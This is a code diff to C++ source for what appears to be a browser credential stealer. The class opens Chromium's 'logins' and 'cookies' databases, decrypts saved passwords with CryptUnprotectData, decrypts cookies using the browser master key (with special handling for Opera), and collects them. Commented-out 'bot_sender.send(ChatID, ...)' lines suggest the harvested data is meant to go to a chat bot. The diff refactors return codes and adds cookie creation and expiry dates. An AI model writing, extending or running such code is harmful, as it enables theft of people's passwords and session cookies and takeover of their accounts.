@@ -21,40 +21,44 @@ ChromiumProcessor::~ChromiumProcessor()
     delete Cookies;
 }
 
-stringstream ChromiumProcessor::ExtractChromiumPasswords()
+int ChromiumProcessor::ExtractChromiumPasswords()
 {
-    cout<<"ChromiumProcessor::getChromiumPW()"<<endl;
+    cout<<"ChromiumProcessor::ExtractChromiumPasswords()"<<endl;
     stringstream dump(string(""));
     if(experimental::filesystem::exists(pass_path))
     {
-        cout<<"exists"<<pass_path<<endl;
         int rc=sqlite3_open(pass_path.c_str(), &ChromiumDB);
         if(rc!=SQLITE_OK)
         {
             cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
+            return -3;
             //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
         }
-        else
-        {
-            //bot_sender.send(ChatID, pass.str());
-        }
+        cout<<"DB is Ok."<<endl;
+        //bot_sender.send(ChatID, pass.str());
     }
     else
     {
-        cerr<<"don't exists"<<pass_path<<endl;
+        cerr<<"File don't exists"<<pass_path<<endl;
         throw invalid_argument("wrong pass_path");
-        return dump;
+        return -2;
     }
 
-    string sql="SELECT action_url, username_value, password_value FROM logins";
+    if(MasterKey==nullptr)
+    {
+        this->ExtractChromiumMasterKey();
+    }
 
+    int rc;
+    unsigned long int i;
+    string sql="SELECT action_url, username_value, password_value FROM logins";
     sqlite3_stmt *pStmt;
-    int rc, i;
+
     rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
     if(rc!=SQLITE_OK)
     {
-        dump<<"statement failed rc="<<rc<<endl;
-        return dump;
+        cerr<<"sqlite: statement failed, rc="<<rc<<endl;
+        return -1;
     }
 
     rc=sqlite3_step(pStmt);
@@ -72,38 +76,22 @@ stringstream ChromiumProcessor::ExtractChromiumPasswords()
         memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
         CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
-        if(decryptedPass.pbData==nullptr || decryptedPass.cbData<1)
-        {
-            i=0;
-            while(encryptedPass.pbData[i])
-            {
-                dump<<encryptedPass.pbData[i];
-                i++;
-            }
-        }
-        else
-        {
-            i=0;
-            while(decryptedPass.pbData[i])
-            {
-                dump<<decryptedPass.pbData[i];
-                i++;
-            }
-        }
+
+
+
         free(encryptedPass.pbData);
         rc=sqlite3_step(pStmt);
     }
     rc=sqlite3_finalize(pStmt);
     sqlite3_close(ChromiumDB);
-    return dump;
+    return 0;
 }
 
 int ChromiumProcessor::ExtractChromiumCookies()
 {
-    cout<<"ChromiumProcessor::getChromiumCookies()"<<endl;
+    cout<<"ChromiumProcessor::ExtractChromiumCookies()"<<endl;
     if(experimental::filesystem::exists(cookies_path))
     {
-        //cout<<"exists "<<cookies_path<<endl;
         int rc=sqlite3_open(cookies_path.c_str(), &ChromiumDB);
         if(rc!=SQLITE_OK)
         {
@@ -126,10 +114,11 @@ int ChromiumProcessor::ExtractChromiumCookies()
         this->ExtractChromiumMasterKey();
     }
 
-    string sql="SELECT host_key, name, path, encrypted_value FROM cookies";
+    int rc;
+    unsigned long int i;
+    string sql="SELECT host_key, name, path, encrypted_value, creation_utc, expires_utc FROM cookies";
     sqlite3_stmt *pStmt;
 
-    int rc;
     rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
     if(rc!=SQLITE_OK)
     {
@@ -154,18 +143,17 @@ int ChromiumProcessor::ExtractChromiumCookies()
         newCookie.Value=EasyDecrypt(&encryptedCookie, MasterKey);
         if(newCookie.Value==string(""))
         {
-            unsigned long int i;
-            string cooDataBuf;
+            string cookieDataBuf;
             for(i=0; encryptedCookie.pbData!=nullptr && i<encryptedCookie.cbData; i++)
             {
-                fprintf(stdout, "%.2x", encryptedCookie.pbData[i]&0xFF);
-                cooDataBuf.append(1, encryptedCookie.pbData[i]);
+                cookieDataBuf.append(1, encryptedCookie.pbData[i]);
             }
-            fprintf(stdout, " < cookie bin data (%lu bytes)\n", i);
-            newCookie.Value=string((char *)encryptedCookie.pbData);
+            newCookie.Value=cookieDataBuf;
         }
-
         delete [] encryptedCookie.pbData;
+        newCookie.CreDate=sqlite3_column_int64(pStmt, 4);
+        newCookie.ExpDate=sqlite3_column_int64(pStmt, 5);
+
         Cookies->push_back(newCookie);
         rc=sqlite3_step(pStmt);
     }
@@ -176,7 +164,7 @@ int ChromiumProcessor::ExtractChromiumCookies()
 
 unsigned char *ChromiumProcessor::ExtractChromiumMasterKey()
 {
-    cout<<"ChromiumProcessor::getMasterKey()"<<endl;
+    cout<<"ChromiumProcessor::ExtractChromiumMasterKey()"<<endl;
     string LocalStateFile_path=userdata_path, stMasterKey;
     if(LocalStateFile_path.find("Opera")!=string::npos)
     {
